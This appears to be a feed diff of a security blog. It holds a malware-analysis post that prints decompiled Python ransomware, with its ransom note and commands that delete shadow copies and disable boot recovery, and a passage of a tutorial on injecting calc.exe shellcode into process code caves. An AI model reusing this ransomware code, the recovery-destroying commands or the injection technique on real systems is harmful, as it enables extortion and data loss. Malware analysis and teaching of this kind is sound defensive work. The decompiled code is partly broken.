+<span class="n">PUBLIC_KEY_PEM</span> <span class="o">=</span> <span class="s">'-----BEGIN PUBLIC KEY-----</span><span class="se">\n</span><span class="s">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDzOPVPDhQAR/xYjucI5SdCugXS</span><span class="se">\n</span><span class="s">G9ZFk5C1It85dOvh+fmD1UNXs5h3R28hUtThRARNh2ar3ADlGGWHIKwoV4P5hZx4</span><span class="se">\n</span><span class="s">q2Cg4odgWrf7a5eskCu3fI4eCTKBSItuEs4nFrjdu6HDXnzVHDkxrkWY96mmoZ9R</span><span class="se">\n</span><span class="s">0zG8Kyo6ofuge9p2IwIDAQAB</span><span class="se">\n</span><span class="s">-----END PUBLIC KEY-----'</span>
+<span class="n">AES_KEY_PATH</span> <span class="o">=</span> <span class="s">'C:</span><span class="se">\\</span><span class="s">ProgramData</span><span class="se">\\</span><span class="s">02dq34jROu.key'</span>
+<span class="n">USER_PATH</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">expanduser</span><span class="p">(</span><span class="s">'~'</span><span class="p">)</span>
+<span class="n">TARGET_DIRS</span> <span class="o">=</span> <span class="p">[</span><span class="s">'Downloads'</span><span class="p">,</span> <span class="s">'Music'</span><span class="p">,</span> <span class="s">'Documents'</span><span class="p">,</span> <span class="s">'Desktop'</span><span class="p">,</span> <span class="s">'Videos'</span><span class="p">,</span> <span class="s">'Pictures'</span><span class="p">]</span>
+<span class="n">EXTENSION</span> <span class="o">=</span> <span class="s">'.02dq34jROu'</span>
+
+<span class="k">def</span> <span class="nf">_34EYLBSVGLRLCR7DM4</span><span class="p">():</span>
+    <span class="k">return</span> <span class="n">serialization</span><span class="p">.</span><span class="n">load_pem_public_key</span><span class="p">(</span><span class="n">PUBLIC_KEY_PEM</span><span class="p">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">backend</span><span class="o">=</span><span class="n">default_backend</span><span class="p">())</span>
+
+<span class="k">def</span> <span class="nf">_JXOPHO2CGWP23DL9L1</span><span class="p">():</span>
+    <span class="n">aes_key</span> <span class="o">=</span> <span class="n">secrets</span><span class="p">.</span><span class="n">token_bytes</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
+    <span class="n">public_key</span> <span class="o">=</span> <span class="n">_34EYLBSVGLRLCR7DM4</span><span class="p">()</span>
+    <span class="n">encrypted_aes_key</span> <span class="o">=</span> <span class="n">public_key</span><span class="p">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">aes_key</span><span class="p">,</span> <span class="n">padding</span><span class="p">.</span><span class="n">OAEP</span><span class="p">(</span><span class="n">mgf</span><span class="o">=</span><span class="n">padding</span><span class="p">.</span><span class="n">MGF1</span><span class="p">(</span><span class="n">algorithm</span><span class="o">=</span><span class="n">hashes</span><span class="p">.</span><span class="n">SHA256</span><span class="p">()),</span> <span class="n">algorithm</span><span class="o">=</span><span class="n">hashes</span><span class="p">.</span><span class="n">SHA256</span><span class="p">(),</span> <span class="n">label</span><span class="o">=</span><span class="bp">None</span><span class="p">))</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">AES_KEY_PATH</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">key_file</span><span class="p">:</span>
+        <span class="n">key_file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">encrypted_aes_key</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">aes_key</span>
+
+<span class="k">def</span> <span class="nf">_0HAHESD3QA17F3OWF7</span><span class="p">():</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="n">AES_KEY_PATH</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">_JXOPHO2CGWP23DL9L1</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">_SSJAVGM86I7CGWDH9W</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="n">aes_key</span><span class="p">):</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">file_path</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="n">EXTENSION</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="ow">not</span> <span class="n">file_path</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="s">'.exe'</span><span class="p">))</span> <span class="ow">and</span> <span class="p">(</span><span class="ow">not</span> <span class="n">file_path</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="s">'.dll'</span><span class="p">))</span> <span class="ow">and</span> <span class="n">file_path</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="s">'.lnk'</span><span class="p">):</span>
+        <span class="k">pass</span>  <span class="c1"># postinserted
+</span>    <span class="k">return</span> <span class="bp">None</span>
+
+<span class="k">def</span> <span class="nf">_LLIRBGOWCAMFAVUTAK</span><span class="p">():</span>
+    <span class="k">global</span> <span class="n">aes_key</span>  <span class="c1"># inserted
+</span>    <span class="n">contentof</span> <span class="o">=</span> <span class="s">'-- Lyrix</span><span class="se">\n\n</span><span class="s">Your data has been encrypted and stolen. The only way to recover it is by contacting us.</span><span class="se">\n</span><span class="s">Do not attempt to use third-party recovery tools — doing so may permanently damage your files.</span><span class="se">\n\n</span><span class="s">To prove that decryption is possible, we are willing to decrypt 2 random files for free.</span><span class="se">\n\n</span><span class="s">You can contact us at:</span><span class="se">\n</span><span class="s">TDVP7boZDZDE4GYWA3qW@protonmail.com</span><span class="se">\n\n</span><span class="s">WARNING!</span><span class="se">\n</span><span class="s">We have also downloaded a portion of your data. If you do not pay, we will release it publicly.</span><span class="se">\n\n</span><span class="s">ID: KVNR2HLU3N9W5BQCPU</span><span class="se">\n</span><span class="s">    '</span>
+    <span class="n">aes_key</span> <span class="o">=</span> <span class="n">_0HAHESD3QA17F3OWF7</span><span class="p">()</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'AES key already exists. Skipping key generation.'</span><span class="p">)</span> <span class="k">if</span> <span class="ow">not</span> <span class="n">aes_key</span> <span class="k">else</span> <span class="bp">None</span>
+    <span class="n">appdata_dir</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">USER_PATH</span><span class="p">,</span> <span class="s">'AppData'</span><span class="p">).</span><span class="n">lower</span><span class="p">()</span>
+    <span class="k">for</span> <span class="n">root</span><span class="p">,</span> <span class="n">dirs</span><span class="p">,</span> <span class="n">files</span> <span class="ow">in</span> <span class="n">os</span><span class="p">.</span><span class="n">walk</span><span class="p">(</span><span class="n">USER_PATH</span><span class="p">):</span>
+        <span class="n">root_normalized</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">abspath</span><span class="p">(</span><span class="n">root</span><span class="p">).</span><span class="n">lower</span><span class="p">()</span>
+        <span class="k">if</span> <span class="n">root_normalized</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="n">appdata_dir</span><span class="p">):</span>
+            <span class="k">continue</span>
+        <span class="n">readme_path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="s">'README.txt'</span><span class="p">)</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">readme_path</span><span class="p">,</span> <span class="s">'w'</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s">'utf-8'</span><span class="p">)</span> <span class="k">as</span> <span class="n">readme_file</span><span class="p">:</span>
+                <span class="n">readme_file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">contentof</span><span class="p">)</span>
+                    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'Created README.txt in: </span><span class="si">{</span><span class="n">root</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+                    <span class="k">for</span> <span class="nb">file</span> <span class="ow">in</span> <span class="n">files</span><span class="p">:</span>
+                        <span class="n">file_path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="nb">file</span><span class="p">)</span>
+                        <span class="k">try</span><span class="p">:</span>
+                            <span class="n">_SSJAVGM86I7CGWDH9W</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="n">aes_key</span><span class="p">)</span>
+                            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'File [</span><span class="si">{</span><span class="n">file_path</span><span class="si">}</span><span class="s">] encrypted'</span><span class="p">)</span>
+    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'[WARNING] Failed to create README.txt in </span><span class="si">{</span><span class="n">root</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'[WARNING] Cannot Encrypt file </span><span class="si">{</span><span class="n">file_path</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="n">_LLIRBGOWCAMFAVUTAK</span><span class="p">()</span>
+<span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span><span class="p">(</span><span class="s">'cmd.exe /c vssadmin delete shadows /all /quiet &amp; wmic shadowcopy delete &amp; bcdedit /set {default} bootstatuspolicy ignoreallfailures &amp; bcdedit /set {default} recoveryenabled no'</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">DEVNULL</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">DEVNULL</span><span class="p">,</span> <span class="n">stdin</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">DEVNULL</span><span class="p">,</span> <span class="n">creationflags</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">CREATE_NO_WINDOW</span><span class="p">)</span>
+<span class="n">extensions_to_list</span> <span class="o">=</span> <span class="p">[</span><span class="s">'.exe'</span><span class="p">,</span> <span class="s">'.dll'</span><span class="p">,</span> <span class="s">'.lnk'</span><span class="p">]</span>
+
+<span class="k">def</span> <span class="nf">list_files</span><span class="p">(</span><span class="n">drive_path</span><span class="p">,</span> <span class="n">extensions</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">root</span><span class="p">,</span> <span class="n">dirs</span><span class="p">,</span> <span class="n">files</span> <span class="ow">in</span> <span class="n">os</span><span class="p">.</span><span class="n">walk</span><span class="p">(</span><span class="n">drive_path</span><span class="p">,</span> <span class="n">topdown</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
+        <span class="k">for</span> <span class="nb">file</span> <span class="ow">in</span> <span class="n">files</span><span class="p">:</span>
+            <span class="k">if</span> <span class="nb">any</span><span class="p">((</span><span class="nb">file</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="n">ext</span><span class="p">)</span> <span class="k">for</span> <span class="n">ext</span> <span class="ow">in</span> <span class="n">extensions</span><span class="p">)):</span>
+                <span class="k">continue</span>
+            <span class="n">file_path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="nb">file</span><span class="p">)</span>
+            <span class="n">_SSJAVGM86I7CGWDH9W</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="n">aes_key</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">drive_letter</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_uppercase</span><span class="p">:</span>
+    <span class="n">drive_path</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">drive_letter</span><span class="si">}</span><span class="s">:/'</span>
+    <span class="k">if</span> <span class="n">drive_letter</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">[</span><span class="s">'C'</span><span class="p">]</span> <span class="ow">and</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="n">drive_path</span><span class="p">):</span>
+        <span class="k">pass</span>  <span class="c1"># postinserted
+</span>    <span class="k">else</span><span class="p">:</span>  <span class="c1"># inserted
+</span>        <span class="k">try</span><span class="p">:</span>
+            <span class="n">list_files</span><span class="p">(</span><span class="n">drive_path</span><span class="p">,</span> <span class="n">extensions_to_list</span><span class="p">)</span>
+<span class="k">except</span> <span class="n">PermissionError</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'Access denied to </span><span class="si">{</span><span class="n">drive_path</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+
+</code></pre></div></div>
+<p>Great! So now we managed to get the literal source code itself.</p>
+
+<p>Let’s explain what the code does step by step:</p>
+
+<h1 id="source-code-explanation">Source code explanation</h1>
+
+<p>Here are the key variables:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">PUBLIC_KEY_PEM</code>: The attacker’s RSA public key, hardcoded into the malware.</li>
+  <li><code class="language-plaintext highlighter-rouge">AES_KEY_PATH</code>: Where the victim’s encrypted AES key will be stored: <code class="language-plaintext highlighter-rouge">C:\ProgramData\02dq34jROu.key</code>. <code class="language-plaintext highlighter-rouge">02dq34jROu</code> is likely a generated ID for the key</li>
+  <li><code class="language-plaintext highlighter-rouge">TARGET_DIRS</code>: Standard folders to attack first (Downloads, Documents, Desktop, etc.).</li>
+  <li><code class="language-plaintext highlighter-rouge">EXTENSION</code>: Files will get renamed with the randomly generated ID <code class="language-plaintext highlighter-rouge">.02dq34jROu</code> after encryption (this code doesn’t show the full renaming though).</li>
+</ul>
+
+<p>The malware also uses <code class="language-plaintext highlighter-rouge">subprocess.Popen(...)</code> commands to deletes all system shadow copies and disables recovery options:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">vssadmin delete shadows /all /quiet</code></li>
+  <li><code class="language-plaintext highlighter-rouge">wmic shadowcopy delete</code></li>
+  <li><code class="language-plaintext highlighter-rouge">bcdedit /set {default} bootstatuspolicy ignoreallfailures</code></li>
+  <li><code class="language-plaintext highlighter-rouge">bcdedit /set {default} recoveryenabled no</code></li>
+</ul>
+
+<p>This makes it harder to recover files without paying.</p>
+
+<p><code class="language-plaintext highlighter-rouge">list_files(drive_path, extensions)</code></p>
+
+<p>Walks through a drive letter (like D:/, E:/).</p>
+
+<p>The encryption routine works like this:</p>
+
+<ul>
+  <li>For every file, if file is <strong>NOT</strong> .exe, .dll, or .lnk, it tries to encrypt it.</li>
+  <li>For every drive letter A: to Z, i<strong>f the drive exists and is NOT C:</strong> (system drive), encrypt files on it.</li>
+</ul>
+
+<p>This ransomware has some bugs and problems, and is likely very ameatur-ish.</p>]]></content><author><name>Alon Alush</name></author><category term="Malware Analysis" /><summary type="html"><![CDATA[Decoding a ransomware sample made in Python, step by step]]></summary></entry><entry><title type="html">Using code caves to inject custom shellcode</title><link href="https://github.com/pages/Alon-Alush/alonalush.github.io/injection/codecaves/" rel="alternate" type="text/html" title="Using code caves to inject custom shellcode" /><published>2025-04-19T00:00:00+00:00</published><updated>2025-04-19T00:00:00+00:00</updated><id>https://github.com/pages/Alon-Alush/alonalush.github.io/injection/codecaves</id><content type="html" xml:base="https://github.com/pages/Alon-Alush/alonalush.github.io/injection/codecaves/"><![CDATA[<h1 id="code-caves">Code caves</h1>
+
+<p>First of all, <strong>what are code caves?</strong></p>
+
+<p>Code caves are a chunk of null bytes (<code class="language-plaintext highlighter-rouge">0x00</code>) in a process’s memory. Here’s how they look like in <code class="language-plaintext highlighter-rouge">x64dbg</code>:</p>
+
+<p><img src="/assets/images/injection/codecaves/codecaves.png" alt="Code cave chunk, x64dbg" /></p>
+
+<p>Instead of <code class="language-plaintext highlighter-rouge">0x00</code> caves, you can also find <code class="language-plaintext highlighter-rouge">0x90</code> (NOP) sleds which can also function as code caves:</p>
+
+<p><img src="/assets/images/injection/codecaves/nopsleds.png" alt="NOP sled, x64dbg" /></p>
+
+<h1 id="how-to-find-these-code-caves">How to find these code caves?</h1>
+
+<p>Most of the times, it’s pretty easy. Just open the target process with <code class="language-plaintext highlighter-rouge">x64dbg</code> and scroll down to the end until you see a bunch of these null instructions:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mo">004026</span><span class="mi">9</span><span class="n">D</span> <span class="o">|</span> <span class="mo">0000</span>                     <span class="o">|</span> <span class="n">add</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="n">ds</span><span class="o">:</span><span class="p">[</span><span class="n">eax</span><span class="p">],</span><span class="n">al</span>                <span class="o">|</span>
+<span class="mo">004026</span><span class="mi">9</span><span class="n">F</span> <span class="o">|</span> <span class="mo">0000</span>                     <span class="o">|</span> <span class="n">add</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="n">ds</span><span class="o">:</span><span class="p">[</span><span class="n">eax</span><span class="p">],</span><span class="n">al</span>                <span class="o">|</span>
+<span class="mo">004026</span><span class="n">A1</span> <span class="o">|</span> <span class="mo">0000</span>                     <span class="o">|</span> <span class="n">add</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="n">ds</span><span class="o">:</span><span class="p">[</span><span class="n">eax</span><span class="p">],</span><span class="n">al</span>                <span class="o">|</span>
+<span class="mo">004026</span><span class="n">A3</span> <span class="o">|</span> <span class="mo">0000</span>                     <span class="o">|</span> <span class="n">add</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="n">ds</span><span class="o">:</span><span class="p">[</span><span class="n">eax</span><span class="p">],</span><span class="n">al</span>                <span class="o">|</span>
+<span class="mo">004026</span><span class="n">A5</span> <span class="o">|</span> <span class="mo">0000</span>                     <span class="o">|</span> <span class="n">add</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="n">ds</span><span class="o">:</span><span class="p">[</span><span class="n">eax</span><span class="p">],</span><span class="n">al</span>                <span class="o">|</span>
+<span class="mo">004026</span><span class="n">A7</span> <span class="o">|</span> <span class="mo">0000</span>                     <span class="o">|</span> <span class="n">add</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="n">ds</span><span class="o">:</span><span class="p">[</span><span class="n">eax</span><span class="p">],</span><span class="n">al</span>                <span class="o">|</span>
+<span class="mo">004026</span><span class="n">A9</span> <span class="o">|</span> <span class="mo">0000</span>                     <span class="o">|</span> <span class="n">add</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="n">ds</span><span class="o">:</span><span class="p">[</span><span class="n">eax</span><span class="p">],</span><span class="n">al</span>                <span class="o">|</span>
+</code></pre></div></div>
+<p>You can then paste your shellcode in place of these null instructions (tutorial below).</p>
+
+<p>If you want, you can also use Cheat Engine’s “Scan for code caves” feature (<code class="language-plaintext highlighter-rouge">CTRL + ALT + C</code> in the Memory Viewer):</p>
+
+<p><img src="/assets/images/injection/codecaves/scan.png" alt="Writing our shellcode" /></p>
+
+<p>Then untick “<em>Also scan non-executable read only memory</em>” (because we want to inject executable shellcode):</p>
+
+<p><img src="/assets/images/injection/codecaves/click.png" alt="Clicking" /></p>
+
+<p>You’ll then be able to see a list of many empty executable addresses within the process’s memory state, that you can use to write your shellcode in:
+<img src="/assets/images/injection/codecaves/addresses.png" alt="Code cave addresses" /></p>
+
+<h1 id="taking-advantage-of-code-caves-to-inject-shellcode">Taking advantage of code caves to inject shellcode</h1>
+
+<p>As you may know, we can take advantage of these unused bytes to directly inject raw executable opcodes (shellcode) within the application.</p>
+
+<p>We can use this simple <strong>x86 shellcode</strong> that opens a calculator (<code class="language-plaintext highlighter-rouge">calc.exe</code>):</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="c1">// open calc.exe (195 bytes x86 shellcode).</span>
+<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> 
+<span class="s">"</span><span class="se">\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x52\xff\xd0</span><span class="s">"</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>First, we’ll go to the code cave, and add the following instructions:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pushad
+pushfd
+</code></pre></div></div>
+
+<p>The x86 instruction <code class="language-plaintext highlighter-rouge">pushad</code> pushes all of the general-purpose register onto the stack, and the <code class="language-plaintext highlighter-rouge">pushfd</code> instruction pushes all the <code class="language-plaintext highlighter-rouge">EFLAGS</code> register onto the stack.</p>
+
+<p>We need these instructions because we will need to restore the original register state and jump back to the original execution flow after executing our shellcode:
+<img src="/assets/images/injection/codecaves/codecaves1.png" alt="Writing initial instructions" /></p>
+
+<p>We can then paste our shellcode after those 2 initial instructions:</p>
+
+<p><img src="/assets/images/injection/codecaves/pasting.png" alt="Writing our shellcode" /></p>
+
+<p>We now have this code instead of the initial <code class="language-plaintext highlighter-rouge">0x00</code> bytes:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mo">00401</span><span class="n">D5D</span> <span class="o">|</span> <span class="mi">60</span>                       <span class="o">|</span> <span class="n">pushad</span>                                  <span class="o">|</span> <span class="c1">// &lt;--- Pushes the contents of the general-purpose registers onto the stack</span>
+<span class="mo">00401</span><span class="n">D5E</span> <span class="o">|</span> <span class="mi">9</span><span class="n">C</span>                       <span class="o">|</span> <span class="n">pushfd</span>                                  <span class="o">|</span> <span class="c1">// &lt;--- Pushes the entire contents of the EFLAGS register onto the stack</span>
+<span class="mo">00401</span><span class="n">D5F</span> <span class="o">|</span> <span class="mf">89E5</span>                     <span class="o">|</span> <span class="n">mov</span> <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>                             <span class="o">|</span> <span class="c1">// We now paste our shellcode</span>
+<span class="mo">00401</span><span class="n">D61</span> <span class="o">|</span> <span class="mi">83</span><span class="n">EC</span> <span class="mi">20</span>                  <span class="o">|</span> <span class="n">sub</span> <span class="n">esp</span><span class="p">,</span><span class="mi">20</span>                              <span class="o">|</span>
+<span class="mo">00401</span><span class="n">D64</span> <span class="o">|</span> <span class="mi">31</span><span class="n">DB</span>                     <span class="o">|</span> <span class="n">xor</span> <span class="n">ebx</span><span class="p">,</span><span class="n">ebx</span>                             <span class="o">|</span>
+<span class="mo">00401</span><span class="n">D66</span> <span class="o">|</span> <span class="mi">64</span><span class="o">:</span><span class="mi">8</span><span class="n">B5B</span> <span class="mi">30</span>               <span class="o">|</span> <span class="n">mov</span> <span class="n">ebx</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="n">fs</span><span class="o">:</span><span class="p">[</span><span class="n">ebx</span><span class="o">+</span><span class="mi">30</span><span class="p">]</span>           <span class="o">|</span>
+<span class="mo">00401</span><span class="n">D6A</span> <span class="o">|</span> <span class="mi">8</span><span class="n">B5B</span> <span class="mi">0</span><span class="n">C</span>                  <span class="o">|</span> <span class="n">mov</span> <span class="n">ebx</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="n">ds</span><span class="o">:</span><span class="p">[</span><span class="n">ebx</span><span class="o">+</span><span class="n">C</span><span class="p">]</span>            <span class="o">|</span>
+<span class="mo">00401</span><span class="n">D6D</span> <span class="o">|</span> <span class="mi">8</span><span class="n">B5B</span> <span class="mi">1</span><span class="n">C</span>                  <span class="o">|</span> <span class="n">mov</span> <span class="n">ebx</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="n">ds</span><span class="o">:</span><span class="p">[</span><span class="n">ebx</span><span class="o">+</span><span class="mi">1</span><span class="n">C</span><span class="p">]</span>           <span class="o">|</span>
+<span class="mo">00401</span><span class="n">D70</span> <span class="o">|</span> <span class="mi">8</span><span class="n">B1B</span>                     <span class="o">|</span> <span class="n">mov</span> <span class="n">ebx</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="n">ds</span><span class="o">:</span><span class="p">[</span><span class="n">ebx</span><span class="p">]</span>              <span class="o">|</span>
+<span class="mo">00401</span><span class="n">D72</span> <span class="o">|</span> <span class="mi">8</span><span class="n">B1B</span>                     <span class="o">|</span> <span class="n">mov</span> <span class="n">ebx</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="n">ds</span><span class="o">:</span><span class="p">[</span><span class="n">ebx</span><span class="p">]</span>              <span class="o">|</span>
+<span class="mo">00401</span><span class="n">D74</span> <span class="o">|</span> <span class="mi">8</span><span class="n">B43</span> <span class="mi">08</span>                  <span class="o">|</span> <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="n">ds</span><span class="o">:</span><span class="p">[</span><span class="n">ebx</span><span class="o">+</span><span class="mi">8</span><span class="p">]</span>            <span class="o">|</span>
+<span class="mo">00401</span><span class="n">D77</span> <span class="o">|</span> <span class="mi">8945</span> <span class="n">FC</span>                  <span class="o">|</span> <span class="n">mov</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="n">ss</span><span class="o">:</span><span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">4</span><span class="p">],</span><span class="n">eax</span>            <span class="o">|</span>
+<span class="mo">00401</span><span class="n">D7A</span> <span class="o">|</span> <span class="mi">8</span><span class="n">B58</span> <span class="mi">3</span><span class="n">C</span>                  <span class="o">|</span> <span class="n">mov</span> <span class="n">ebx</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="n">ds</span><span class="o">:</span><span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mi">3</span><span class="n">C</span><span class="p">]</span>           <span class="o">|</span>
+<span class="mo">00401</span><span class="n">D7D</span> <span class="o">|</span> <span class="mo">01</span><span class="n">C3</span>                     <span class="o">|</span> <span class="n">add</span> <span class="n">ebx</span><span class="p">,</span><span class="n">eax</span>                             <span class="o">|</span>
+<span class="mo">00401</span><span class="n">D7F</span> <span class="o">|</span> <span class="mi">8</span><span class="n">B5B</span> <span class="mi">78</span>                  <span class="o">|</span> <span class="n">mov</span> <span class="n">ebx</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="n">ds</span><span class="o">:</span><span class="p">[</span><span class="n">ebx</span><span class="o">+</span><span class="mi">78</span><span class="p">]</span>           <span class="o">|</span>
+<span class="mo">00401</span><span class="n">D82</span> <span class="o">|</span> <span class="mo">01</span><span class="n">C3</span>                     <span class="o">|</span> <span class="n">add</span> <span class="n">ebx</span><span class="p">,</span><span class="n">eax</span>                             <span class="o">|</span>
+<span class="mo">00401</span><span class="n">D84</span> <span class="o">|</span> <span class="mi">8</span><span class="n">B7B</span> <span class="mi">20</span>                  <span class="o">|</span> <span class="n">mov</span> <span class="n">edi</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="n">ds</span><span class="o">:</span><span class="p">[</span><span class="n">ebx</span><span class="o">+</span><span class="mi">20</span><span class="p">]</span>           <span class="o">|</span> <span class="n">edi</span><span class="o">:</span><span class="n">EntryPoint</span>
